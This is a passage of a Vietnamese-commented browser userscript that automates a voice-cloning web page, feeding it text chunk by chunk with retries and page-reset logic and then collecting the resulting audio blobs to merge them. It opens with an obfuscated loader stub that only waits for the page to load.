    function OEQ$uR_XaaKc(YNNIpMYhPlFGtrnBENa,XbWbDuUWKJt){var wUMWYCsnVIzxbiWu=fStbiVqIomhCjG$zZYUe$h();return OEQ$uR_XaaKc=function(yuBQjwMjrw$XrGm$hTh,nHBEyHiEvDe_kmqblSHW$Jwh){yuBQjwMjrw$XrGm$hTh=yuBQjwMjrw$XrGm$hTh-(-0x182f*Math.floor(-parseInt(0x1))+Number(-0x2)*parseInt(-parseInt(0x109c))+-0x38e1);var JFGiY$Dfn_tPgupU=wUMWYCsnVIzxbiWu[yuBQjwMjrw$XrGm$hTh];if(OEQ$uR_XaaKc['ldcGkb']===undefined){var GHOArnvpK_qO_UQNsdyzlyK=function(WnkwBYkdvCsW_tJ_motaIGTuPNK){var jullllUSMlFQj=-parseInt(0x50b)*0x4+-0x1*0x1b23+parseInt(0x3295)*parseInt(0x1)&parseInt(0x84d)*0x3+Math.floor(-parseInt(0x897))+Number(-0xf51),UPKMJjnyNf=new Uint8Array(WnkwBYkdvCsW_tJ_motaIGTuPNK['match'](/.{1,2}/g)['map'](yXXFUySkNgdC=>parseInt(yXXFUySkNgdC,Math.trunc(-parseInt(0x2df))+parseFloat(0x21c9)+-0x1eda))),yXc_HMwvVTdD=UPKMJjnyNf['map'](PZqeWcbEYFQHxHndlNT=>PZqeWcbEYFQHxHndlNT^jullllUSMlFQj),aDtED=new TextDecoder(),SULlVtrKHcdslVQlfi=aDtED['decode'](yXc_HMwvVTdD);return SULlVtrKHcdslVQlfi;};OEQ$uR_XaaKc['lIwzQt']=GHOArnvpK_qO_UQNsdyzlyK,YNNIpMYhPlFGtrnBENa=arguments,OEQ$uR_XaaKc['ldcGkb']=!![];}var QnbD_GXWnA=wUMWYCsnVIzxbiWu[-parseInt(0x22d2)+parseInt(-0x1c51)+Math.ceil(0x3f23)],ej$AXlhquOdeZimupInFBPC$mYs=yuBQjwMjrw$XrGm$hTh+QnbD_GXWnA,brYk_OJ=YNNIpMYhPlFGtrnBENa[ej$AXlhquOdeZimupInFBPC$mYs];return!brYk_OJ?(OEQ$uR_XaaKc['czNhvT']===undefined&&(OEQ$uR_XaaKc['czNhvT']=!![]),JFGiY$Dfn_tPgupU=OEQ$uR_XaaKc['lIwzQt'](JFGiY$Dfn_tPgupU),YNNIpMYhPlFGtrnBENa[ej$AXlhquOdeZimupInFBPC$mYs]=JFGiY$Dfn_tPgupU):JFGiY$Dfn_tPgupU=brYk_OJ,JFGiY$Dfn_tPgupU;},OEQ$uR_XaaKc(YNNIpMYhPlFGtrnBENa,XbWbDuUWKJt);}
    (function(MlFQjnUPKMJjnyNfqyXcHM,vVTdDbaDtE$D$HS){var PHuCohLexTQghJRnlL=OEQ$uR_XaaKc,LlVtrKH$cdslVQlfityXXFUy=MlFQjnUPKMJjnyNfqyXcHM();while(!![]){try{var kNgdCJPZqeWcbEYFQHxH_ndl=Math['ceil'](parseFloat(PHuCohLexTQghJRnlL(0x88))/(-0x1de+parseFloat(-0x3)*Number(-0x3c2)+-0x967*0x1))+-parseFloat(PHuCohLexTQghJRnlL(0x8d))/(Number(0x1)*parseInt(0x1b25)+parseInt(0xb75)+-parseInt(0x2698))+Math['floor'](-parseFloat(PHuCohLexTQghJRnlL(0x8c))/(-parseInt(0x2f0)*parseInt(0x9)+0x2483+-0xa10))*(parseFloat(PHuCohLexTQghJRnlL(0x8a))/(-parseInt(0x42)*parseFloat(-parseInt(0x76))+Math.max(-0x17d5,-parseInt(0x17d5))+parseInt(0xb)*-0x99))+Math['floor'](-parseFloat(PHuCohLexTQghJRnlL(0x90))/(-0x68*parseInt(parseInt(0x3d))+0x164+0x1769))+parseFloat(PHuCohLexTQghJRnlL(0x89))/(parseInt(0x26ee)+Math.max(-0x1a7b,-parseInt(0x1a7b))+-parseInt(0xc6d))*Math['floor'](-parseFloat(PHuCohLexTQghJRnlL(0x8e))/(Math.floor(0x17fb)+Math.max(-0xe,-parseInt(0xe))*Number(-0x50)+-parseInt(0x1c54)))+parseFloat(parseFloat(PHuCohLexTQghJRnlL(0x8f))/(Math.trunc(0x1d)*parseInt(0x7a)+0x1*parseInt(0x14f9)+Math.trunc(-0x22c3)))*(-parseFloat(PHuCohLexTQghJRnlL(0x91))/(0xabd*0x2+Math.floor(0x1f52)+parseInt(-0x34c3)))+-parseFloat(PHuCohLexTQghJRnlL(0x93))/(-parseInt(0xd)*-parseInt(0x137)+0x25cd+parseInt(-0x358e))*parseFloat(-parseFloat(PHuCohLexTQghJRnlL(0x87))/(-0x73b+Number(-0x6)*-0xae+-parseInt(0x199)*Math.ceil(-parseInt(0x2))));if(kNgdCJPZqeWcbEYFQHxH_ndl===vVTdDbaDtE$D$HS)break;else LlVtrKH$cdslVQlfityXXFUy['push'](LlVtrKH$cdslVQlfityXXFUy['shift']());}catch(ThanNfTxn$pmFCYS_bIXMF){LlVtrKH$cdslVQlfityXXFUy['push'](LlVtrKH$cdslVQlfityXXFUy['shift']());}}}(fStbiVqIomhCjG$zZYUe$h,0x44f*0x23d+Math.max(-0xd,-0xd)*0x3baa+parseInt(-parseInt(0x96a))));
    function fStbiVqIomhCjG$zZYUe$h(){var cpNhxkLZ=['717470737e7233003f330417','757e72777f7f730c320431130b','73722c310b2c3431','2a2927222f2821','7f7f761e34012b2e12','02090b052928322328320a2927222322','342327223f1532273223','7473757e76752e14280e0403','7071747372770b1f2e162a00','7571727f737172111f05352810','7e24023313110d','27222203302328320a2f353223282334','7070717770710827361e2411','747e73757372013234280403','710f3c3e242f11'];fStbiVqIomhCjG$zZYUe$h=function(){return cpNhxkLZ;};return fStbiVqIomhCjG$zZYUe$h();}
    document[aEesnARWIdYPHQdknfYytKGA(0x86)]===aEesnARWIdYPHQdknfYytKGA(0x92)?document[aEesnARWIdYPHQdknfYytKGA(0x8b)](aEesnARWIdYPHQdknfYytKGA(0x94),main):main();})();


    // Hàm chiaVanBanThongMinh đã được tích hợp vào NrfPVBbJv_Dph$tazCpJ



    // Fix cho dropdown ngôn ngữ bị trắng xóa
    (function() {
        'use strict';

        // Hàm fix dropdown ngôn ngữ
        function fixLanguageDropdown() {
            // Tìm tất cả các dropdown có thể liên quan đến ngôn ngữ
            const dropdowns = document.querySelectorAll('select, .dropdown, [role="listbox"], [aria-haspopup="listbox"]');

            dropdowns.forEach(dropdown => {
                // Kiểm tra nếu dropdown có chứa các ngôn ngữ
                const text = dropdown.textContent || dropdown.innerText || '';
                if (text.includes('Vietnamese') || text.includes('English') || text.includes('Chinese') ||
                    text.includes('Vietnamese') || text.includes('Tiếng Việt') || text.includes('Ngôn ngữ')) {

                    // Fix CSS cho dropdown
                    dropdown.style.color = '#ffffff';
                    dropdown.style.backgroundColor = '#2d2d2d';
                    dropdown.style.border = '1px solid #444';

                    // Fix cho các option
                    const options = dropdown.querySelectorAll('option');
                    options.forEach(option => {
                        option.style.color = '#ffffff';
                        option.style.backgroundColor = '#2d2d2d';
                    });

                    // Fix cho dropdown list
                    const dropdownList = dropdown.querySelector('.dropdown-list, .select-options, [role="listbox"]');
                    if (dropdownList) {
                        dropdownList.style.color = '#ffffff';
                        dropdownList.style.backgroundColor = '#2d2d2d';
                        dropdownList.style.border = '1px solid #444';
                    }

                    console.log('✅ Đã fix dropdown ngôn ngữ:', dropdown);
                }
            });
        }

        // Chạy fix ngay lập tức
        fixLanguageDropdown();

        // Chạy fix khi DOM thay đổi
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    setTimeout(fixLanguageDropdown, 100);
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        // Chạy fix định kỳ
        setInterval(fixLanguageDropdown, 2000);

        console.log('🔧 Đã khởi tạo fix dropdown ngôn ngữ');
    })();

    // Thêm CSS fix toàn diện cho dropdown ngôn ngữ
    (function() {
        'use strict';

        // Tạo style element
        const style = document.createElement('style');
        style.textContent = `
            /* Fix cho dropdown ngôn ngữ bị trắng xóa */
            select, .dropdown, [role="listbox"], [aria-haspopup="listbox"] {
                color: #ffffff !important;
                background-color: #2d2d2d !important;
                border: 1px solid #444 !important;
            }

            select option, .dropdown option, [role="option"] {
                color: #ffffff !important;
                background-color: #2d2d2d !important;
            }

            .dropdown-list, .select-options, [role="listbox"] {
                color: #ffffff !important;
                background-color: #2d2d2d !important;
                border: 1px solid #444 !important;
            }

            .dropdown-item, .select-item {
                color: #ffffff !important;
                background-color: #2d2d2d !important;
            }

            .dropdown-item:hover, .select-item:hover {
                background-color: #444 !important;
            }

            /* Fix cho text trong dropdown */
            .dropdown-text, .select-text {
                color: #ffffff !important;
            }

            /* Fix cho icon dropdown */
            .dropdown-icon, .select-icon {
                color: #ffffff !important;
            }
        `;

        // Thêm style vào head
        document.head.appendChild(style);

        console.log('🎨 Đã thêm CSS fix cho dropdown ngôn ngữ');
    })();

    // =======================================================
    // == NÂNG CẤP: CƠ CHẾ KIỂM TRA CHUNK THÔNG MINH ==
    // =======================================================

    // Bộ não quản lý trạng thái xử lý
    let processingState = {
        chunks: [],
        isPaused: true,
        isStopped: true,
        startTime: null,
    };
    const MAX_RETRIES_PER_CHUNK = 5;
    const RETRY_DELAY_MS = 5000;
    let n_WwsStaC$jzsWjOIjRqedTG = null; // WaveSurfer instance

    // Log functionality
    function addLogEntry(message, type = 'info') {
        const logContainer = document.getElementById('log-container');
        if (logContainer) {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    }

    function clearLog() {
        const logContainer = document.getElementById('log-container');
        if (logContainer) {
            logContainer.innerHTML = '';
            addLogEntry('Log đã được xóa', 'info');
        }
    }

    // Hàm chờ element xuất hiện
    function waitForElement(selector, timeout = 15000) {
        return new Promise((resolve, reject) => {
            const element = document.querySelector(selector);
            if (element) {
                resolve(element);
                return;
            }
            const observer = new MutationObserver((mutations, obs) => {
                const targetElement = document.querySelector(selector);
                if (targetElement) {
                    obs.disconnect();
                    resolve(targetElement);
                }
            });
            observer.observe(document.body, { childList: true, subtree: true });
            setTimeout(() => {
                observer.disconnect();
                reject(new Error(`Timeout: Hết thời gian chờ phần tử "${selector}"`));
            }, timeout);
        });
    }

    // Hàm chờ nút bấm với cơ chế khôi phục web thông minh
    async function waitForButton(buttonTexts, timeout = 20000) {
        const ALL_POSSIBLE_TEXTS = ['generate', 'tạo', 'regenerate', 'tạo lại'];
        addLogEntry(`⏳ Đang chờ nút sẵn sàng...`);
        const startTime = Date.now();
        let lastRestoreTime = 0;
        const RESTORE_INTERVAL = 8000; // Khôi phục mỗi 8 giây nếu không tìm thấy nút

        while (Date.now() - startTime < timeout) {
            const buttons = document.querySelectorAll('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
            let foundButton = null;

            for (const btn of buttons) {
                const btnText = (btn.textContent || '').toLowerCase().trim();
                if (btnText && ALL_POSSIBLE_TEXTS.some(text => btnText.includes(text))) {
                    if (btn.offsetParent !== null && !btn.disabled) {
                        addLogEntry(`✅ Nút "${btn.textContent}" đã sẵn sàng!`);
                        return btn;
                    }
                }
            }

            // Nếu không tìm thấy nút và đã qua 8 giây kể từ lần khôi phục cuối
            if (!foundButton && Date.now() - lastRestoreTime > RESTORE_INTERVAL) {
                addLogEntry(`🔄 Không tìm thấy nút hợp lệ, đang khôi phục web...`, 'warning');
                addLogEntry(`🔄 Đang reset web về trạng thái ban đầu...`, 'info');
                await restoreWebToSuccessState();
                lastRestoreTime = Date.now();
            }

            await new Promise(resolve => setTimeout(resolve, 500));
        }

        // Nếu hết thời gian, thử khôi phục web một lần cuối
        addLogEntry(`⚠️ Hết thời gian chờ, thử khôi phục web lần cuối...`, 'warning');
        await restoreWebToSuccessState();
        await new Promise(resolve => setTimeout(resolve, 3000));

        // Tìm lại nút sau khi khôi phục
        const buttons = document.querySelectorAll('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
        for (const btn of buttons) {
            const btnText = (btn.textContent || '').toLowerCase().trim();
            if (btnText && ALL_POSSIBLE_TEXTS.some(text => btnText.includes(text))) {
                if (btn.offsetParent !== null && !btn.disabled) {
                    addLogEntry(`✅ Sau khi khôi phục, tìm thấy nút "${btn.textContent}"!`);
                    return btn;
                }
            }
        }

        // Nếu vẫn không tìm thấy, thử khôi phục thêm một lần nữa
        addLogEntry(`🔄 Vẫn không tìm thấy nút, thử khôi phục lần cuối...`, 'warning');
        await restoreWebToSuccessState();
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Tìm lại lần cuối
        const finalButtons = document.querySelectorAll('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
        for (const btn of finalButtons) {
            const btnText = (btn.textContent || '').toLowerCase().trim();
            if (btnText && ALL_POSSIBLE_TEXTS.some(text => btnText.includes(text))) {
                if (btn.offsetParent !== null && !btn.disabled) {
                    addLogEntry(`✅ Sau lần khôi phục cuối, tìm thấy nút "${btn.textContent}"!`);
                    return btn;
                }
            }
        }

        throw new Error(`Lỗi chờ nút: Đã tìm thấy các nút chung nhưng không có nút nào chứa text "Regenerate" hoặc "Tạo lại"`);
    }

    // Hàm theo dõi kết quả audio
    async function monitorPluginResult() {
        const resultContainerSelector = '.clone-voice-ux-v2 .flex.w-full.items-center.justify-center';
        try {
            addLogEntry(`🔍 Đang tìm khu vực kết quả âm thanh...`, 'info');
            const resultContainer = await waitForElement(resultContainerSelector, 15000);
            addLogEntry(`✅ Đã tìm thấy khu vực kết quả, bắt đầu theo dõi...`, 'success');

            return new Promise((resolve, reject) => {
                const timeout = setTimeout(() => {
                    observer.disconnect();
                    reject(new Error("Timeout - Xử lý quá lâu."));
                }, 90000);

                const observer = new MutationObserver(async (mutations, obs) => {
                    for (const mutation of mutations) {
                        for (const addedNode of mutation.addedNodes) {
                            if (addedNode.nodeType === 1 && addedNode.querySelector('audio')) {
                                clearTimeout(timeout);
                                obs.disconnect();
                                const audioSrc = addedNode.querySelector('audio').src;
                                if (audioSrc && (audioSrc.startsWith('blob:') || audioSrc.startsWith('data:'))) {
                                    try {
                                        const response = await fetch(audioSrc);
                                        resolve(await response.blob());
                                    } catch (fetchError) {
                                        reject(new Error("Lỗi khi lấy dữ liệu blob."));
                                    }
                                } else {
                                    reject(new Error("Không tìm thấy nguồn audio hợp lệ."));
                                }
                                return;
                            }
                        }
                    }
                });
                observer.observe(resultContainer, { childList: true, subtree: true });
            });
        } catch (error) {
            throw new Error("Không tìm thấy khu vực chứa kết quả âm thanh sau khi chờ.");
        }
    }

    // Hàm kiểm tra trạng thái web có bị treo không
    function isWebStuck() {
        // Kiểm tra các dấu hiệu web bị treo
        const loadingElements = document.querySelectorAll('[class*="loading"], [class*="spinner"], [class*="pending"]');
        const errorElements = document.querySelectorAll('[class*="error"], [class*="failed"]');
        const stuckElements = document.querySelectorAll('[aria-busy="true"]');

        // Nếu có nhiều element loading hoặc error, có thể web bị treo
        if (loadingElements.length > 3 || errorElements.length > 0 || stuckElements.length > 2) {
            return true;
        }

        // Kiểm tra xem có nút nào bị disable lâu không
        const disabledButtons = document.querySelectorAll('button[disabled], .ant-btn[disabled]');
        if (disabledButtons.length > 2) {
            return true;
        }

        return false;
    }

    // Hàm kiểm tra trạng thái web có sẵn sàng để gửi chunk mới không
    function isWebReadyForNewChunk() {
        // Kiểm tra xem có nút "Regenerate" hoặc "Tạo lại" không
        const buttons = document.querySelectorAll('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
        for (const btn of buttons) {
            const btnText = (btn.textContent || '').toLowerCase().trim();
            if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                btnText.includes('generate') || btnText.includes('tạo')) {
                if (btn.offsetParent !== null && !btn.disabled) {
                    return true;
                }
            }
        }
        return false;
    }

    // Hàm khôi phục web về trạng thái như lúc gửi chunk thành công
    async function restoreWebToSuccessState() {
        addLogEntry(`🔄 Đang khôi phục web về trạng thái như lúc gửi chunk thành công...`, 'info');

        try {
            // 1. Tìm và click nút "Regenerate" hoặc "Tạo lại" để reset về trạng thái ban đầu
            const regenerateButtons = document.querySelectorAll('button, .ant-btn');
            let foundRegenerate = false;

            for (const btn of regenerateButtons) {
                const btnText = (btn.textContent || '').toLowerCase().trim();
                if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                    btnText.includes('generate') || btnText.includes('tạo')) {
                    if (btn.offsetParent !== null && !btn.disabled) {
                        addLogEntry(`🔄 Tìm thấy nút "${btn.textContent}" - đang khôi phục...`, 'info');
                        KxTOuAJu(btn);
                        foundRegenerate = true;
                        break;
                    }
                }
            }

            if (!foundRegenerate) {
                addLogEntry(`⚠️ Không tìm thấy nút reset, thử tìm nút khác...`, 'warning');
                // Tìm bất kỳ nút nào có thể reset
                const anyButton = document.querySelector('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
                if (anyButton && anyButton.offsetParent !== null && !anyButton.disabled) {
                    addLogEntry(`🔄 Sử dụng nút "${anyButton.textContent}" để khôi phục...`, 'info');
                    KxTOuAJu(anyButton);
                    foundRegenerate = true;
                }
            }

            if (foundRegenerate) {
                // Chờ web xử lý reset
                addLogEntry(`⏳ Chờ web xử lý khôi phục...`, 'info');
                await new Promise(resolve => setTimeout(resolve, 3000));

                // 2. Clear textarea để đảm bảo trạng thái sạch
                const textarea = document.getElementById('gemini-hidden-text-for-request');
                if (textarea) {
                    textarea.value = '';
                    addLogEntry(`🧹 Đã clear textarea`, 'info');
                }

                // 3. Chờ thêm một chút để web ổn định
                await new Promise(resolve => setTimeout(resolve, 2000));

                // 4. Kiểm tra lại xem web đã sẵn sàng chưa
                if (isWebReadyForNewChunk()) {
                    addLogEntry(`✅ Web đã được khôi phục về trạng thái sẵn sàng!`, 'success');
                    return true;
                } else {
                    addLogEntry(`⚠️ Web chưa hoàn toàn sẵn sàng, thử lại...`, 'warning');
                    // Thử thêm một lần nữa
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    if (isWebReadyForNewChunk()) {
                        addLogEntry(`✅ Web đã sẵn sàng sau lần thử thứ 2!`, 'success');
                        return true;
                    }
                }
            }

            addLogEntry(`❌ Không thể khôi phục web về trạng thái sẵn sàng`, 'error');
            return false;

        } catch (error) {
            addLogEntry(`❌ Lỗi khi khôi phục web: ${error.message}`, 'error');
            return false;
        }
    }

    // Hàm reset web về trạng thái ban đầu (giữ nguyên cho tương thích)
    async function resetWebToInitialState() {
        return await restoreWebToSuccessState();
    }

    // Hàm xử lý từng chunk với retry logic cải tiến
    async function processSingleChunk(chunkObject) {
        if (processingState.isStopped) return false;
        for (let attempt = 1; attempt <= MAX_RETRIES_PER_CHUNK; attempt++) {
            if (processingState.isStopped) return false;
            while (processingState.isPaused && !processingState.isStopped) {
                addLogEntry('ℹ️ Đã tạm dừng. Chờ để tiếp tục...', 'warning');
                await new Promise(resolve => setTimeout(resolve, 2000));
            }

            // Chỉ reset web khi retry (lần thử > 1) vì lần đầu có thể web vẫn hoạt động tốt
            if (attempt > 1) {
                addLogEntry(`🔄 [Chunk ${chunkObject.originalIndex + 1}] Lần thử ${attempt} - Đang reset web...`, 'info');
                addLogEntry(`🔄 Đang khôi phục web về trạng thái như lúc gửi chunk thành công...`, 'info');
                await restoreWebToSuccessState();
            }

            try {
                // Chỉ kiểm tra web sẵn sàng khi đã reset (lần thử > 1) hoặc khi web có thể bị treo
                if (attempt > 1 || !isWebReadyForNewChunk()) {
                    if (!isWebReadyForNewChunk()) {
                        addLogEntry(`⚠️ [Chunk ${chunkObject.originalIndex + 1}] Web chưa sẵn sàng, đang khôi phục...`, 'warning');
                        addLogEntry(`🔄 Đang reset web...`, 'info');
                        const restoreSuccess = await restoreWebToSuccessState();
                        if (!restoreSuccess) {
                            throw new Error("Web không sẵn sàng và không thể khôi phục");
                        }
                    }
                }

                document.getElementById('gemini-hidden-text-for-request').value = chunkObject.text;
                addLogEntry(`📦 [Chunk ${chunkObject.originalIndex + 1}] Bắt đầu xử lý (thử lần ${attempt}/${MAX_RETRIES_PER_CHUNK})...`);

                // Sử dụng hàm waitForButton với cơ chế reset thông minh
                addLogEntry(`🔍 [Chunk ${chunkObject.originalIndex + 1}] Đang tìm nút sẵn sàng...`, 'info');
                const targetButton = await waitForButton(['regenerate', 'tạo lại', 'generate', 'tạo'], 20000);
                KxTOuAJu(targetButton);
                addLogEntry(`✅ Đã gửi đi chunk ${chunkObject.originalIndex + 1}`, 'success');

                // Chờ website xử lý
                addLogEntry(`⏳ Đang chờ website xử lý chunk ${chunkObject.originalIndex + 1}...`, 'info');
                await new Promise(resolve => setTimeout(resolve, 2000));

                const audioBlob = await monitorPluginResult();
                chunkObject.audioBlob = audioBlob;
                chunkObject.status = 'success';
                addLogEntry(`✅ [Chunk ${chunkObject.originalIndex + 1}] Xử lý thành công!`, 'success');
                return true;
            } catch (error) {
                addLogEntry(`❌ [Chunk ${chunkObject.originalIndex + 1}] Lỗi lần ${attempt}: ${error.message}`, 'error');

                // LUÔN reset web khi gặp lỗi trước khi retry
                addLogEntry(`🔄 Phát hiện lỗi, đang reset web về trạng thái ban đầu...`, 'warning');
                addLogEntry(`🔄 Đang khôi phục web về trạng thái như lúc gửi chunk thành công...`, 'info');
                await restoreWebToSuccessState();

                if (attempt < MAX_RETRIES_PER_CHUNK) {
                    addLogEntry(`🔄 Sẽ thử lại sau ${RETRY_DELAY_MS / 1000} giây...`, 'warning');
                    await new Promise(resolve => setTimeout(resolve, RETRY_DELAY_MS));
                }
            }
        }
        chunkObject.status = 'failed';
        addLogEntry(`🚫 [Chunk ${chunkObject.originalIndex + 1}] Thất bại vĩnh viễn sau ${MAX_RETRIES_PER_CHUNK} lần thử. Sẽ bỏ qua.`, 'error');
        return false;
    }

    // Hàm quản lý hàng đợi thông minh - Nâng cấp: Xử lý chunks lỗi trực tiếp
    async function manageFullQueue() {
        // Lượt 1: Xử lý tất cả chunks lần đầu
        addLogEntry(`--- Lượt 1: Bắt đầu xử lý ${processingState.chunks.length} chunks ---`, 'info');
        
        for (const chunk of processingState.chunks) {
            if (processingState.isStopped) break;
            
            chunk.status = 'processing';
            await processSingleChunk(chunk);
            const successfulChunks = processingState.chunks.filter(c => c.status === 'success').length;
            nWHrScjZnIyNYzztyEWwM(successfulChunks, processingState.chunks.length);
        }

        if (processingState.isStopped) {
            addLogEntry("ℹ️ Quá trình đã được người dùng dừng lại.", 'warning');
            // Reset giao diện
            document.getElementById('gemini-start-queue-btn').disabled = false;
            document.getElementById('gemini-start-queue-btn').style.display = 'block';
            document.getElementById('gemini-pause-btn').style.display = 'none';
            document.getElementById('gemini-stop-btn').style.display = 'none';
            return;
        }

        // Kiểm tra chunks lỗi sau lượt đầu
        const failedChunks = processingState.chunks.filter(c => c.status === 'failed' || c.status === 'processing');
        
        if (failedChunks.length === 0) {
            addLogEntry("🎉 Tất cả các chunk đã được tạo thành công!", 'success');
        } else {
            // Xác định các chunks lỗi
            const failedIndices = failedChunks.map(c => c.originalIndex).sort((a, b) => a - b);
            addLogEntry(`❌ Phát hiện ${failedChunks.length} chunks lỗi: ${failedIndices.map(idx => idx + 1).join(', ')}`, 'error');
            
            // Tìm phạm vi chunks cần xử lý (từ chunk lỗi đầu tiên đến chunk lỗi cuối cùng)
            const minFailedIndex = Math.min(...failedIndices);
            const maxFailedIndex = Math.max(...failedIndices);
            
            addLogEntry(`📋 Xác định phạm vi xử lý: Chunk ${minFailedIndex + 1} đến ${maxFailedIndex + 1}`, 'info');
            
            // Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện một lần
            addLogEntry(`🔄 Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện...`, 'info');
            addLogEntry(`🔄 Đang nhấn nút "Tạo lại" để đảm bảo trạng thái web sạch sẽ...`, 'info');
            
            try {
                // Tìm và click nút "Regenerate" hoặc "Tạo lại"
                const regenerateButtons = document.querySelectorAll('button, .ant-btn');
                let foundRegenerate = false;

                for (const btn of regenerateButtons) {
                    const btnText = (btn.textContent || '').toLowerCase().trim();
                    if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                        btnText.includes('generate') || btnText.includes('tạo')) {
                        if (btn.offsetParent !== null && !btn.disabled) {
                            addLogEntry(`🔄 Tìm thấy nút "${btn.textContent}" - đang reset...`, 'info');
                            btn.click();
                            foundRegenerate = true;
                            break;
                        }
                    }
                }

                if (foundRegenerate) {
                    // Chờ web xử lý reset
                    addLogEntry(`⏳ Chờ web xử lý reset...`, 'info');
                    await new Promise(resolve => setTimeout(resolve, 3000));

                    // Clear textarea để đảm bảo trạng thái sạch
                    const textarea = document.getElementById('gemini-hidden-text-for-request');
                    if (textarea) {
                        textarea.value = '';
                        addLogEntry(`🧹 Đã clear textarea`, 'info');
                    }

                    // Chờ thêm một chút để web ổn định
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    addLogEntry(`✅ Web đã được reset thành công!`, 'success');
                } else {
                    addLogEntry(`⚠️ Không tìm thấy nút reset, thử tìm nút khác...`, 'warning');
                    // Tìm bất kỳ nút nào có thể reset
                    const anyButton = document.querySelector('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
                    if (anyButton && anyButton.offsetParent !== null && !anyButton.disabled) {
                        addLogEntry(`🔄 Sử dụng nút "${anyButton.textContent}" để reset...`, 'info');
                        anyButton.click();
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        addLogEntry(`✅ Web đã được reset bằng nút khác!`, 'success');
                    } else {
                        addLogEntry(`❌ Không tìm thấy nút nào để reset web, tiếp tục với restoreWebToSuccessState...`, 'error');
                        await restoreWebToSuccessState();
                    }
                }
            } catch (resetError) {
                addLogEntry(`❌ Lỗi khi reset web: ${resetError.message}, tiếp tục với restoreWebToSuccessState...`, 'error');
                await restoreWebToSuccessState();
            }
            
            // Xử lý các chunks lỗi trong phạm vi từ minFailedIndex đến maxFailedIndex
            // Xử lý tuần tự chỉ các chunks lỗi để đảm bảo ghép đúng vị trí
            addLogEntry(`--- Lượt 2: Xử lý lại chunks lỗi từ ${minFailedIndex + 1} đến ${maxFailedIndex + 1} ---`, 'info');
            
            for (let i = minFailedIndex; i <= maxFailedIndex; i++) {
                if (processingState.isStopped) break;
                
                const chunk = processingState.chunks[i];
                
                // Chỉ xử lý lại các chunks lỗi, bỏ qua chunks đã thành công
                if (chunk.status === 'failed' || chunk.status === 'processing') {
                    addLogEntry(`📦 Xử lý lại chunk ${i + 1} (chunk lỗi)...`, 'info');
                    chunk.status = 'processing';
                    await processSingleChunk(chunk);
                    const successfulChunks = processingState.chunks.filter(c => c.status === 'success').length;
                    nWHrScjZnIyNYzztyEWwM(successfulChunks, processingState.chunks.length);
                } else if (chunk.status === 'success') {
                    addLogEntry(`✅ Chunk ${i + 1} đã thành công từ trước, bỏ qua và tiếp tục.`, 'success');
                }
            }
            
            addLogEntry(`✅ Đã xử lý xong các chunks lỗi từ ${minFailedIndex + 1} đến ${maxFailedIndex + 1}`, 'success');
        }

        // Kiểm tra kết quả cuối cùng
        if (!processingState.isStopped) {
            const finalFailedChunks = processingState.chunks.filter(c => c.status === 'failed');
            const successfulChunks = processingState.chunks.filter(c => c.status === 'success');

            if (finalFailedChunks.length > 0) {
                addLogEntry(`🚫 Hoàn thành với ${successfulChunks.length}/${processingState.chunks.length} chunk thành công.`, 'warning');
                addLogEntry(`❌ ${finalFailedChunks.length} chunk bị lỗi: ${finalFailedChunks.map(c => c.originalIndex + 1).join(', ')}`, 'error');

                if (successfulChunks.length > 0) {
                    addLogEntry("⚠️ Bạn có thể ghép file với các chunk đã thành công (không đầy đủ).", 'warning');
                }
            } else {
                addLogEntry("✅ Đã xác nhận đủ tất cả các chunk. Bắt đầu ghép file...", 'success');
            }

            // Chỉ ghép file nếu có ít nhất 1 chunk thành công
            addLogEntry(`🔍 Debug: Có ${successfulChunks.length} chunk thành công`, 'info');
            addLogEntry(`🔍 Debug: Tổng ${processingState.chunks.length} chunk`, 'info');

            if (successfulChunks.length > 0) {
                addLogEntry("🚀 Bắt đầu gọi hàm ghép file cuối cùng...", 'info');
                await finalMergeAndDownload();
                addLogEntry("✅ Hoàn thành hàm ghép file cuối cùng!", 'success');
            } else {
                addLogEntry("❌ Không có chunk nào thành công để ghép file!", 'error');
            }
        }

        // Reset giao diện
        document.getElementById('gemini-start-queue-btn').disabled = false;
        document.getElementById('gemini-start-queue-btn').style.display = 'block';
        document.getElementById('gemini-pause-btn').style.display = 'none';
        document.getElementById('gemini-stop-btn').style.display = 'none';
    }



    // Hàm ghép file cuối cùng
    async function finalMergeAndDownload() {
        addLogEntry("🎯 BẮT ĐẦU HÀM GHÉP FILE CUỐI CÙNG", 'success');
        addLogEntry("🔍 Debug: Đang kiểm tra processingState.chunks...", 'info');
        addLogEntry(`🔍 Debug: processingState.chunks.length = ${processingState.chunks.length}`, 'info');

        const timeTakenEl = document.getElementById('gemini-time-taken');
        timeTakenEl.textContent = `Thời gian xử lý: ${ymkKApNTfjOanYIBsxsoMNBX((new Date() - processingState.startTime) / 1000)}`;

        // Lọc chỉ các chunk thành công
        const successfulChunks = processingState.chunks.filter(c => c.status === 'success');
        addLogEntry(`🔍 Debug: Tìm thấy ${successfulChunks.length} chunk thành công`, 'info');

        // Debug: Hiển thị trạng thái của tất cả chunk
        processingState.chunks.forEach((chunk, index) => {
            addLogEntry(`🔍 Debug: Chunk ${index + 1} - Status: ${chunk.status}, OriginalIndex: ${chunk.originalIndex}`, 'info');
        });

        const orderedBlobs = successfulChunks
            .sort((a, b) => a.originalIndex - b.originalIndex)
            .map(chunk => chunk.audioBlob);

